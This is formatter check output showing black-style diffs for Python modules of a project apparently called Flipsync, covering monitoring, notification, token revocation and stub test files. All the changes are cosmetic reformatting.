 
         # Find old conversations
         old_conversation_ids = [
-            c_id for c_id, c in self._conversations.items()
+            c_id
+            for c_id, c in self._conversations.items()
             if c.end_time and c.end_time < cutoff_time
         ]
 
         # Remove old conversations
         for c_id in old_conversation_ids:
@@ -634,11 +694,13 @@
 
             if c_id in self._responses:
                 del self._responses[c_id]
 
         if old_conversation_ids:
-            self.logger.info(f"Cleaned up {len(old_conversation_ids)} old conversations")
+            self.logger.info(
+                f"Cleaned up {len(old_conversation_ids)} old conversations"
+            )
 
     async def _store_conversation(self, metrics: ConversationMetrics) -> None:
         """Store a conversation to disk."""
         try:
             # Create file path
@@ -762,11 +824,11 @@
         return html
 
     async def close(self) -> None:
         """Close the collector and clean up resources."""
         self._is_running = False
-        if hasattr(self, '_cleanup_task') and self._cleanup_task:
+        if hasattr(self, "_cleanup_task") and self._cleanup_task:
             self._cleanup_task.cancel()
             try:
                 await self._cleanup_task
             except asyncio.CancelledError:
                 pass
@@ -891,6 +953,6 @@
     return await get_conversation_metrics_collector().record_agent_turn(
         conversation_id=conversation_id,
         response_type=response_type,
         content_length=content_length,
         processing_time=processing_time,
-    )
\ No newline at end of file
+    )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/conversation/conversation_metrics.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/notifications/device_manager.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/notifications/device_manager.py	2025-06-19 04:03:55.926634+00:00
@@ -8,28 +8,30 @@
 logger = logging.getLogger(__name__)
 
 
 class DeviceManager:
     """Simple device manager for compatibility."""
-    
+
     def __init__(self):
         """Initialize device manager."""
         self._devices = {}
-    
-    async def register_device(self, device_id: str, device_info: Dict[str, Any]) -> bool:
+
+    async def register_device(
+        self, device_id: str, device_info: Dict[str, Any]
+    ) -> bool:
         """Register a device."""
         self._devices[device_id] = device_info
         return True
-    
+
     async def unregister_device(self, device_id: str) -> bool:
         """Unregister a device."""
         return self._devices.pop(device_id, None) is not None
-    
+
     async def get_device(self, device_id: str) -> Optional[Dict[str, Any]]:
         """Get device information."""
         return self._devices.get(device_id)
-    
+
     async def list_devices(self, user_id: Optional[str] = None) -> List[Dict[str, Any]]:
         """List devices."""
         devices = list(self._devices.values())
         if user_id:
             devices = [d for d in devices if d.get("user_id") == user_id]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/notifications/device_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/payment/test_paypal_service.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/payment/test_paypal_service.py	2025-06-19 04:03:55.973125+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for paypal_service
 
 This module contains API/Services focused tests for the migrated paypal_service component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from paypal_service import *
+
 
 class TestPaypalServiceAPIServices:
     """API/Services test class for paypal_service."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/payment/test_paypal_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/pipeline/test_controller.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/pipeline/test_controller.py	2025-06-19 04:03:56.068210+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from controller import *
+
 
 class TestControllerAgent:
     """Agent test class for controller."""
 
     def test_import(self):
@@ -58,7 +59,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/pipeline/test_controller.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/protocols/test_agent_protocol.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/protocols/test_agent_protocol.py	2025-06-19 04:03:56.157403+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from agent_protocol import *
+
 
 class TestAgentProtocolAgent:
     """Agent test class for agent_protocol."""
 
     def test_import(self):
@@ -58,7 +59,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/protocols/test_agent_protocol.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/mobile/mobile_context_provider.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/mobile/mobile_context_provider.py	2025-06-19 04:03:56.230466+00:00
@@ -86,11 +86,13 @@
 
             # Set up logger
             self.logger = get_logger("mobile_context")
 
             # Set up storage
-            self.storage_path = Path(storage_path) if storage_path else Path("logs/mobile_context")
+            self.storage_path = (
+                Path(storage_path) if storage_path else Path("logs/mobile_context")
+            )
             self.storage_path.mkdir(parents=True, exist_ok=True)
 
             # Store configuration
             self.update_interval = update_interval
             self.enable_battery_optimization = enable_battery_optimization
@@ -323,11 +325,15 @@
             try:
                 # Update context
                 await self._update_context()
 
                 # Process offline queue if online
-                if self.offline_support and self._current_context and self._current_context.network_type != NetworkType.NONE:
+                if (
+                    self.offline_support
+                    and self._current_context
+                    and self._current_context.network_type != NetworkType.NONE
+                ):
                     await self._process_offline_queue()
 
                 # Store context
                 await self._store_context()
             except Exception as e:
@@ -385,11 +391,11 @@
             # Add to history
             self._context_history.append(context)
 
             # Trim history if needed
             if len(self._context_history) > self._max_history_size:
-                self._context_history = self._context_history[-self._max_history_size:]
+                self._context_history = self._context_history[-self._max_history_size :]
 
             self.logger.debug(
                 f"Updated mobile context: battery={battery_level:.0%}, network={network_type.name}"
             )
         except Exception as e:
@@ -419,30 +425,36 @@
     def _queue_offline_data(self, size_bytes: int, priority: str) -> None:
         """Queue data for sending when online."""
         if not self.offline_support:
             return
 
-        self._offline_queue.append({
-            "size_bytes": size_bytes,
-            "priority": priority,
-            "timestamp": datetime.now(timezone.utc).isoformat(),
-        })
-
-        self.logger.debug(f"Queued {size_bytes} bytes of {priority} data for offline sending")
+        self._offline_queue.append(
+            {
+                "size_bytes": size_bytes,
+                "priority": priority,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+        )
+
+        self.logger.debug(
+            f"Queued {size_bytes} bytes of {priority} data for offline sending"
+        )
 
     async def _process_offline_queue(self) -> None:
         """Process the offline data queue."""
         if not self._offline_queue:
             return
 
-        self.logger.info(f"Processing offline queue with {len(self._offline_queue)} items")
+        self.logger.info(
+            f"Processing offline queue with {len(self._offline_queue)} items"
+        )
 
         # Process queue in priority order
         priority_order = {"critical": 0, "high": 1, "normal": 2, "low": 3}
         sorted_queue = sorted(
             self._offline_queue,
-            key=lambda x: priority_order.get(x["priority"].lower(), 999)
+            key=lambda x: priority_order.get(x["priority"].lower(), 999),
         )
 
         # Process items
         remaining_queue = []
         for item in sorted_queue:
@@ -452,11 +464,13 @@
                 item["priority"],
             )
 
             if can_send:
                 # In a real implementation, this would trigger the actual sending
-                self.logger.debug(f"Sending queued data: {item['size_bytes']} bytes, {item['priority']} priority")
+                self.logger.debug(
+                    f"Sending queued data: {item['size_bytes']} bytes, {item['priority']} priority"
+                )
             else:
                 # Keep in queue
                 remaining_queue.append(item)
 
         # Update queue
@@ -468,11 +482,11 @@
             self.logger.info("Offline queue processed successfully")
 
     async def close(self) -> None:
         """Close the provider and clean up resources."""
         self._is_running = False
-        if hasattr(self, '_update_task') and self._update_task:
+        if hasattr(self, "_update_task") and self._update_task:
             self._update_task.cancel()
             try:
                 await self._update_task
             except asyncio.CancelledError:
                 pass
@@ -533,11 +547,13 @@
         size_bytes: Optional size of metrics data in bytes
 
     Returns:
         Whether metrics should be collected
     """
-    return await get_mobile_context_provider().should_collect_metrics(category, size_bytes)
+    return await get_mobile_context_provider().should_collect_metrics(
+        category, size_bytes
+    )
 
 
 async def should_send_data_in_mobile_context(
     size_bytes: int, priority: str = "normal"
 ) -> bool:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/mobile/mobile_context_provider.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/production_monitor.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/production_monitor.py	2025-06-19 04:03:56.293823+00:00
@@ -16,19 +16,21 @@
 logger = logging.getLogger(__name__)
 
 
 class AlertLevel(Enum):
     """Alert severity levels."""
+
     INFO = "info"
     WARNING = "warning"
     ERROR = "error"
     CRITICAL = "critical"
 
 
 @dataclass
 class Alert:
     """Alert data structure."""
+
     id: str
     level: AlertLevel
     title: str
     message: str
     timestamp: datetime
@@ -39,318 +41,342 @@
 
 
 @dataclass
 class MetricThreshold:
     """Metric threshold configuration."""
+
     warning: float
     error: float
     critical: float
     unit: str = ""
     description: str = ""
 
 
 class SystemMetricsCollector:
     """Collect system-level metrics."""
-    
+
     def __init__(self):
         self.process = psutil.Process()
-        
+
     def collect_metrics(self) -> Dict[str, Any]:
         """Collect current system metrics."""
         try:
             # CPU metrics
             cpu_percent = psutil.cpu_percent(interval=1)
             cpu_count = psutil.cpu_count()
-            
+
             # Memory metrics
             memory = psutil.virtual_memory()
             process_memory = self.process.memory_info()
-            
+
             # Disk metrics
-            disk = psutil.disk_usage('/')
-            
+            disk = psutil.disk_usage("/")
+
             # Network metrics (if available)
             try:
                 network = psutil.net_io_counters()
                 network_stats = {
                     "bytes_sent": network.bytes_sent,
                     "bytes_recv": network.bytes_recv,
                     "packets_sent": network.packets_sent,
-                    "packets_recv": network.packets_recv
+                    "packets_recv": network.packets_recv,
                 }
             except:
                 network_stats = {}
-            
+
             return {
                 "timestamp": datetime.utcnow().isoformat(),
                 "cpu": {
                     "percent": cpu_percent,
                     "count": cpu_count,
-                    "load_avg": list(psutil.getloadavg()) if hasattr(psutil, 'getloadavg') else []
+                    "load_avg": (
+                        list(psutil.getloadavg())
+                        if hasattr(psutil, "getloadavg")
+                        else []
+                    ),
                 },
                 "memory": {
                     "total": memory.total,
                     "available": memory.available,
                     "percent": memory.percent,
                     "used": memory.used,
                     "process_rss": process_memory.rss,
-                    "process_vms": process_memory.vms
+                    "process_vms": process_memory.vms,
                 },
                 "disk": {
                     "total": disk.total,
                     "used": disk.used,
                     "free": disk.free,
-                    "percent": disk.percent
+                    "percent": disk.percent,
                 },
-                "network": network_stats
+                "network": network_stats,
             }
-            
+
         except Exception as e:
             logger.error(f"Error collecting system metrics: {e}")
             return {"error": str(e), "timestamp": datetime.utcnow().isoformat()}
 
 
 class ApplicationMetricsCollector:
     """Collect application-specific metrics."""
-    
+
     def __init__(self):
         self.request_count = 0
         self.error_count = 0
         self.response_times = deque(maxlen=1000)
-        self.endpoint_stats = defaultdict(lambda: {"count": 0, "errors": 0, "total_time": 0})
+        self.endpoint_stats = defaultdict(
+            lambda: {"count": 0, "errors": 0, "total_time": 0}
+        )
         self.active_connections = 0
-        
+
     def record_request(self, endpoint: str, response_time_ms: float, status_code: int):
         """Record request metrics."""
         self.request_count += 1
         self.response_times.append(response_time_ms)
-        
+
         stats = self.endpoint_stats[endpoint]
         stats["count"] += 1
         stats["total_time"] += response_time_ms
-        
+
         if status_code >= 400:
             self.error_count += 1
             stats["errors"] += 1
-            
+
     def get_metrics(self) -> Dict[str, Any]:
         """Get current application metrics."""
         if not self.response_times:
             avg_response_time = 0
             p95_response_time = 0
         else:
             times = sorted(list(self.response_times))
             avg_response_time = sum(times) / len(times)
             p95_index = int(len(times) * 0.95)
-            p95_response_time = times[p95_index] if p95_index < len(times) else times[-1]
-        
+            p95_response_time = (
+                times[p95_index] if p95_index < len(times) else times[-1]
+            )
+
         error_rate = (self.error_count / max(self.request_count, 1)) * 100
-        
+
         return {
             "timestamp": datetime.utcnow().isoformat(),
             "requests": {
                 "total": self.request_count,
                 "errors": self.error_count,
-                "error_rate_percent": error_rate
+                "error_rate_percent": error_rate,
             },
             "response_times": {
                 "avg_ms": avg_response_time,
                 "p95_ms": p95_response_time,
-                "count": len(self.response_times)
+                "count": len(self.response_times),
             },
-            "connections": {
-                "active": self.active_connections
-            },
-            "endpoints": dict(self.endpoint_stats)
+            "connections": {"active": self.active_connections},
+            "endpoints": dict(self.endpoint_stats),
         }
 
 
 class ProductionMonitor:
     """Main production monitoring system."""
-    
+
     def __init__(self, config: Optional[Dict[str, Any]] = None):
         self.config = config or self._default_config()
-        
+
         # Metrics collectors
         self.system_collector = SystemMetricsCollector()
         self.app_collector = ApplicationMetricsCollector()
-        
+
         # Alert management
         self.alerts: List[Alert] = []
         self.alert_handlers: List[Callable[[Alert], None]] = []
         self.thresholds = self._setup_thresholds()
-        
+
         # Monitoring state
         self.is_monitoring = False
         self.last_check = datetime.utcnow()
-        
+
         # Metrics history
         self.metrics_history = deque(maxlen=1000)
-        
+
     def _default_config(self) -> Dict[str, Any]:
         """Default monitoring configuration."""
         return {
             "check_interval": 60,  # seconds
             "metrics_retention": 24,  # hours
             "alert_cooldown": 300,  # seconds
             "enable_system_monitoring": True,
             "enable_app_monitoring": True,
-            "enable_alerting": True
+            "enable_alerting": True,
         }
-        
+
     def _setup_thresholds(self) -> Dict[str, MetricThreshold]:
         """Setup metric thresholds for alerting."""
         return {
             "cpu_percent": MetricThreshold(70.0, 85.0, 95.0, "%", "CPU usage"),
             "memory_percent": MetricThreshold(70.0, 85.0, 95.0, "%", "Memory usage"),
             "disk_percent": MetricThreshold(80.0, 90.0, 95.0, "%", "Disk usage"),
             "error_rate": MetricThreshold(5.0, 10.0, 20.0, "%", "Error rate"),
-            "avg_response_time": MetricThreshold(200.0, 500.0, 1000.0, "ms", "Average response time"),
-            "p95_response_time": MetricThreshold(500.0, 1000.0, 2000.0, "ms", "95th percentile response time")
+            "avg_response_time": MetricThreshold(
+                200.0, 500.0, 1000.0, "ms", "Average response time"
+            ),
+            "p95_response_time": MetricThreshold(
+                500.0, 1000.0, 2000.0, "ms", "95th percentile response time"
+            ),
         }
-        
+
     def add_alert_handler(self, handler: Callable[[Alert], None]):
         """Add alert handler function."""
         self.alert_handlers.append(handler)
-        
-    def _trigger_alert(self, alert_id: str, level: AlertLevel, title: str, message: str, 
-                      source: str = "monitor", metadata: Optional[Dict[str, Any]] = None):
+
+    def _trigger_alert(
+        self,
+        alert_id: str,
+        level: AlertLevel,
+        title: str,
+        message: str,
+        source: str = "monitor",
+        metadata: Optional[Dict[str, Any]] = None,
+    ):
         """Trigger an alert."""
         alert = Alert(
             id=alert_id,
             level=level,
             title=title,
             message=message,
             timestamp=datetime.utcnow(),
             source=source,
             metadata=metadata or {},
-            resolved=False
+            resolved=False,
         )
-        
+
         self.alerts.append(alert)
-        
+
         # Call alert handlers
         for handler in self.alert_handlers:
             try:
                 handler(alert)
             except Exception as e:
                 logger.error(f"Error in alert handler: {e}")
-                
+
         logger.warning(f"ALERT [{level.value.upper()}] {title}: {message}")
-        
+
     def _check_thresholds(self, metrics: Dict[str, Any]):
         """Check metrics against thresholds and trigger alerts."""
         if not self.config.get("enable_alerting", True):
             return
-            
+
         # Check system metrics
         if "cpu" in metrics and "percent" in metrics["cpu"]:
             cpu_percent = metrics["cpu"]["percent"]
             threshold = self.thresholds["cpu_percent"]
-            
+
             if cpu_percent >= threshold.critical:
                 self._trigger_alert(
-                    "high_cpu_critical", AlertLevel.CRITICAL,
-                    "Critical CPU Usage", 
+                    "high_cpu_critical",
+                    AlertLevel.CRITICAL,
+                    "Critical CPU Usage",
                     f"CPU usage is {cpu_percent:.1f}% (threshold: {threshold.critical}%)",
-                    metadata={"cpu_percent": cpu_percent}
+                    metadata={"cpu_percent": cpu_percent},
                 )
             elif cpu_percent >= threshold.error:
                 self._trigger_alert(
-                    "high_cpu_error", AlertLevel.ERROR,
+                    "high_cpu_error",
+                    AlertLevel.ERROR,
                     "High CPU Usage",
                     f"CPU usage is {cpu_percent:.1f}% (threshold: {threshold.error}%)",
-                    metadata={"cpu_percent": cpu_percent}
+                    metadata={"cpu_percent": cpu_percent},
                 )
-                
+
         # Check memory metrics
         if "memory" in metrics and "percent" in metrics["memory"]:
             memory_percent = metrics["memory"]["percent"]
             threshold = self.thresholds["memory_percent"]
-            
+
             if memory_percent >= threshold.critical:
                 self._trigger_alert(
-                    "high_memory_critical", AlertLevel.CRITICAL,
+                    "high_memory_critical",
+                    AlertLevel.CRITICAL,
                     "Critical Memory Usage",
                     f"Memory usage is {memory_percent:.1f}% (threshold: {threshold.critical}%)",
-                    metadata={"memory_percent": memory_percent}
+                    metadata={"memory_percent": memory_percent},
                 )
-                
+
         # Check application metrics
         if "requests" in metrics and "error_rate_percent" in metrics["requests"]:
             error_rate = metrics["requests"]["error_rate_percent"]
             threshold = self.thresholds["error_rate"]
-            
+
             if error_rate >= threshold.error:
                 self._trigger_alert(
-                    "high_error_rate", AlertLevel.ERROR,
+                    "high_error_rate",
+                    AlertLevel.ERROR,
                     "High Error Rate",
                     f"Error rate is {error_rate:.1f}% (threshold: {threshold.error}%)",
-                    metadata={"error_rate": error_rate}
+                    metadata={"error_rate": error_rate},
                 )
-                
+
     async def start_monitoring(self):
         """Start the monitoring loop."""
         if self.is_monitoring:
             return
-            
+
         self.is_monitoring = True
         logger.info("Starting production monitoring")
-        
+
         while self.is_monitoring:
             try:
                 await self._monitoring_cycle()
                 await asyncio.sleep(self.config["check_interval"])
             except Exception as e:
                 logger.error(f"Error in monitoring cycle: {e}")
                 await asyncio.sleep(5)  # Short delay before retry
-                
+
     async def _monitoring_cycle(self):
         """Single monitoring cycle."""
         # Collect metrics
         metrics = {}
-        
+
         if self.config.get("enable_system_monitoring", True):
             system_metrics = self.system_collector.collect_metrics()
             metrics.update(system_metrics)
-            
+
         if self.config.get("enable_app_monitoring", True):
             app_metrics = self.app_collector.get_metrics()
             metrics["application"] = app_metrics
-            
+
         # Store metrics
         self.metrics_history.append(metrics)
-        
+
         # Check thresholds
         combined_metrics = {**metrics}
         if "application" in metrics:
             combined_metrics.update(metrics["application"])
-            
+
         self._check_thresholds(combined_metrics)
-        
+
         self.last_check = datetime.utcnow()
-        
+
     def stop_monitoring(self):
         """Stop the monitoring loop."""
         self.is_monitoring = False
         logger.info("Stopped production monitoring")
-        
+
     def get_dashboard_data(self) -> Dict[str, Any]:
         """Get data for monitoring dashboard."""
-        recent_metrics = list(self.metrics_history)[-10:] if self.metrics_history else []
+        recent_metrics = (
+            list(self.metrics_history)[-10:] if self.metrics_history else []
+        )
         active_alerts = [alert for alert in self.alerts if not alert.resolved]
-        
+
         return {
             "status": "monitoring" if self.is_monitoring else "stopped",
             "last_check": self.last_check.isoformat(),
             "recent_metrics": recent_metrics,
             "active_alerts": [asdict(alert) for alert in active_alerts],
             "alert_count": len(active_alerts),
             "total_alerts": len(self.alerts),
-            "thresholds": {k: asdict(v) for k, v in self.thresholds.items()}
+            "thresholds": {k: asdict(v) for k, v in self.thresholds.items()},
         }
-        
+
     def record_request(self, endpoint: str, response_time_ms: float, status_code: int):
         """Record request for application monitoring."""
         self.app_collector.record_request(endpoint, response_time_ms, status_code)
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/production_monitor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/redis/token_revocation.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/redis/token_revocation.py	2025-06-19 04:03:56.411757+00:00
@@ -11,35 +11,35 @@
 logger = logging.getLogger(__name__)
 
 
 class TokenRevocationService:
     """Service for managing token revocation."""
-    
+
     def __init__(self, redis_manager):
         """Initialize token revocation service."""
         self.redis_manager = redis_manager
-    
+
     async def revoke_token(self, jti: str) -> bool:
         """Revoke a token by JTI."""
         try:
             client = await self.redis_manager.get_client()
             await client.set(f"revoked_token:{jti}", "revoked")
             return True
         except Exception as e:
             logger.error(f"Failed to revoke token {jti}: {e}")
             return False
-    
+
     async def is_token_revoked(self, jti: str) -> bool:
         """Check if a token is revoked."""
         try:
             client = await self.redis_manager.get_client()
             result = await client.get(f"revoked_token:{jti}")
             return result is not None
         except Exception as e:
             logger.error(f"Failed to check token revocation {jti}: {e}")
             return False
-    
+
     async def revoke_all_user_tokens(self, user_id: str) -> bool:
         """Revoke all tokens for a user."""
         try:
             client = await self.redis_manager.get_client()
             await client.set(f"revoked_user:{user_id}", "revoked")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/redis/token_revocation.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/token_monitor.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/token_monitor.py	2025-06-19 04:03:56.503725+00:00
@@ -78,12 +78,14 @@
             self.token_usage[token_id].append(usage_record)
 
             # Keep only recent usage (last 24 hours)
             cutoff_time = datetime.now(timezone.utc) - timedelta(hours=24)
             self.token_usage[token_id] = [
-                record for record in self.token_usage[token_id]
-                if datetime.fromisoformat(record["timestamp"].replace("Z", "+00:00")) > cutoff_time
+                record
+                for record in self.token_usage[token_id]
+                if datetime.fromisoformat(record["timestamp"].replace("Z", "+00:00"))
+                > cutoff_time
             ]
 
             logger.debug(f"Recorded token usage for {token_id}: {endpoint}")
 
         except Exception as e:
@@ -118,11 +120,13 @@
             # Count requests in window
             usage_records = self.token_usage.get(token_id, [])
             requests_in_window = 0
 
             for record in usage_records:
-                record_time = datetime.fromisoformat(record["timestamp"].replace("Z", "+00:00"))
+                record_time = datetime.fromisoformat(
+                    record["timestamp"].replace("Z", "+00:00")
+                )
                 if record_time > window_start and record["endpoint"] == endpoint:
                     requests_in_window += 1
 
             remaining_requests = max(0, max_requests - requests_in_window)
             is_within_limit = requests_in_window < max_requests
@@ -141,11 +145,13 @@
                 "reset_time": reset_time.isoformat(),
                 "checked_at": current_time.isoformat(),
             }
 
             if not is_within_limit:
-                logger.warning(f"Rate limit exceeded for token {token_id} on {endpoint}")
+                logger.warning(
+                    f"Rate limit exceeded for token {token_id} on {endpoint}"
+                )
 
             return result
 
         except Exception as e:
             logger.error(f"Error checking rate limit: {e}")
@@ -178,12 +184,14 @@
             cutoff_time = datetime.now(timezone.utc) - timedelta(hours=hours)
             usage_records = self.token_usage.get(token_id, [])
 
             # Filter records within time window
             recent_records = [
-                record for record in usage_records
-                if datetime.fromisoformat(record["timestamp"].replace("Z", "+00:00")) > cutoff_time
+                record
+                for record in usage_records
+                if datetime.fromisoformat(record["timestamp"].replace("Z", "+00:00"))
+                > cutoff_time
             ]
 
             if not recent_records:
                 return {
                     "token_id": token_id,
@@ -197,14 +205,20 @@
             # Calculate statistics
             total_requests = len(recent_records)
             unique_endpoints = len(set(record["endpoint"] for record in recent_records))
 
             response_times = [record["response_time_ms"] for record in recent_records]
-            avg_response_time = sum(response_times) / len(response_times) if response_times else 0.0
-
-            error_requests = len([r for r in recent_records if r["response_code"] >= 400])
-            error_rate = (error_requests / total_requests) * 100 if total_requests > 0 else 0.0
+            avg_response_time = (
+                sum(response_times) / len(response_times) if response_times else 0.0
+            )
+
+            error_requests = len(
+                [r for r in recent_records if r["response_code"] >= 400]
+            )
+            error_rate = (
+                (error_requests / total_requests) * 100 if total_requests > 0 else 0.0
+            )
 
             # Endpoint breakdown
             endpoint_counts = {}
             for record in recent_records:
                 endpoint = record["endpoint"]
@@ -259,11 +273,13 @@
             "max_requests": max_requests,
             "window_minutes": window_minutes,
             "created_at": datetime.now(timezone.utc).isoformat(),
         }
 
-        logger.info(f"Set rate limit for {token_id} on {endpoint}: {max_requests}/{window_minutes}min")
+        logger.info(
+            f"Set rate limit for {token_id} on {endpoint}: {max_requests}/{window_minutes}min"
+        )
 
     async def get_all_token_stats(self) -> List[Dict[str, Any]]:
         """
         Get statistics for all monitored tokens.
 
@@ -298,12 +314,14 @@
 
         for token_id in list(self.token_usage.keys()):
             original_count = len(self.token_usage[token_id])
 
             self.token_usage[token_id] = [
-                record for record in self.token_usage[token_id]
-                if datetime.fromisoformat(record["timestamp"].replace("Z", "+00:00")) > cutoff_time
+                record
+                for record in self.token_usage[token_id]
+                if datetime.fromisoformat(record["timestamp"].replace("Z", "+00:00"))
+                > cutoff_time
             ]
 
             new_count = len(self.token_usage[token_id])
             cleaned_count += original_count - new_count
 
@@ -396,11 +414,12 @@
         return {
             "token_id": token_id,
             "api_type": api_type,
             "hourly_limit": hourly_status,
             "daily_limit": daily_status,
-            "within_limits": hourly_status["within_limit"] and daily_status["within_limit"],
+            "within_limits": hourly_status["within_limit"]
+            and daily_status["within_limit"],
         }
 
     async def record_ebay_api_call(
         self,
         token_id: str,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/token_monitor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/thermal_monitor.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/thermal_monitor.py	2025-06-19 04:03:56.650762+00:00
@@ -18,36 +18,41 @@
 
 # AGENT_INSTRUCTION: Configure logging for thermal monitoring
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+
 @dataclass
 class ThermalReading:
     """Thermal sensor reading data structure"""
+
     timestamp: datetime
     cpu_temp: float
     gpu_temp: Optional[float]
     cpu_usage: float
     gpu_usage: Optional[float]
     throttling_active: bool
 
+
 class ThermalMonitor:
     """
     AGENT_CONTEXT: Comprehensive thermal monitoring and protection system
     AGENT_CAPABILITY: CPU/GPU temperature monitoring with automatic throttling
     AGENT_SAFETY: Prevents thermal damage during development operations
     """
-    
-    def __init__(self, 
-                 cpu_warning_temp: float = 80.0,
-                 cpu_critical_temp: float = 85.0,
-                 gpu_warning_temp: float = 75.0,
-                 gpu_critical_temp: float = 80.0,
-                 monitoring_interval: int = 5):
+
+    def __init__(
+        self,
+        cpu_warning_temp: float = 80.0,
+        cpu_critical_temp: float = 85.0,
+        gpu_warning_temp: float = 75.0,
+        gpu_critical_temp: float = 80.0,
+        monitoring_interval: int = 5,
+    ):
         """
         Initialize thermal monitoring system
-        
+
         Args:
             cpu_warning_temp: CPU temperature warning threshold (C)
             cpu_critical_temp: CPU temperature critical threshold (C)
             gpu_warning_temp: GPU temperature warning threshold (C)
             gpu_critical_temp: GPU temperature critical threshold (C)
@@ -56,267 +61,320 @@
         self.cpu_warning_temp = cpu_warning_temp
         self.cpu_critical_temp = cpu_critical_temp
         self.gpu_warning_temp = gpu_warning_temp
         self.gpu_critical_temp = gpu_critical_temp
         self.monitoring_interval = monitoring_interval
-        
+
         self.throttling_active = False
         self.readings_history: List[ThermalReading] = []
         self.max_history_size = 1000
-        
+
         # AGENT_PATTERN: Initialize monitoring state
         self.is_monitoring = False
         self.monitor_task: Optional[asyncio.Task] = None
-        
-        logger.info(f"Thermal monitor initialized - CPU: {cpu_warning_temp}C/{cpu_critical_temp}C, GPU: {gpu_warning_temp}C/{gpu_critical_temp}C")
+
+        logger.info(
+            f"Thermal monitor initialized - CPU: {cpu_warning_temp}C/{cpu_critical_temp}C, GPU: {gpu_warning_temp}C/{gpu_critical_temp}C"
+        )
 
     def get_cpu_temperature(self) -> Optional[float]:
         """Get current CPU temperature"""
         try:
             # Try multiple methods to get CPU temperature
             temps = psutil.sensors_temperatures()
-            
+
             # Check for common sensor names
-            for sensor_name in ['coretemp', 'cpu_thermal', 'acpi']:
+            for sensor_name in ["coretemp", "cpu_thermal", "acpi"]:
                 if sensor_name in temps:
                     for sensor in temps[sensor_name]:
-                        if 'Package' in sensor.label or 'Core' in sensor.label:
+                        if "Package" in sensor.label or "Core" in sensor.label:
                             return sensor.current
                     # If no specific core found, use first sensor
                     if temps[sensor_name]:
                         return temps[sensor_name][0].current
-            
+
             # Fallback: use any available temperature sensor
             for sensor_group in temps.values():
                 if sensor_group:
                     return sensor_group[0].current
-                    
+
         except Exception as e:
             logger.warning(f"Failed to get CPU temperature: {e}")
-        
+
         return None
 
     def get_gpu_temperature(self) -> Optional[float]:
         """Get current GPU temperature using nvidia-smi"""
         try:
-            result = subprocess.run([
-                'nvidia-smi', '--query-gpu=temperature.gpu',
-                '--format=csv,noheader,nounits'
-            ], capture_output=True, text=True, timeout=5)
-            
+            result = subprocess.run(
+                [
+                    "nvidia-smi",
+                    "--query-gpu=temperature.gpu",
+                    "--format=csv,noheader,nounits",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=5,
+            )
+
             if result.returncode == 0:
                 temp_str = result.stdout.strip()
                 if temp_str and temp_str.isdigit():
                     return float(temp_str)
-        except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError) as e:
+        except (
+            subprocess.TimeoutExpired,
+            FileNotFoundError,
+            subprocess.SubprocessError,
+        ) as e:
             logger.debug(f"GPU temperature unavailable: {e}")
-        
+
         return None
 
